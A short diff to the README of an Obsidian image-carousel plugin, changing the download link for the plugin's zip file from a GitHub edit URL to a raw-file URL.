@@ -1,6 +1,6 @@
 # Obsidian-Image-Carousel-Plugin
 A plugin for Obsidian that allows you to elegantly display multiple images in a carousel format within your notes.
-[download](https://github.com/dxconia/Obsidian-Image-Carousel-Plugin/edit/Obsidian-Image-Carousel-Plugin/image-carousel-plugin.zip)
+[download](https://github.com/dxconia/Obsidian-Image-Carousel-Plugin/raw/Obsidian-Image-Carousel-Plugin/image-carousel-plugin.zip)
 ## Key Features
 
 1. **Image Carousel Display**
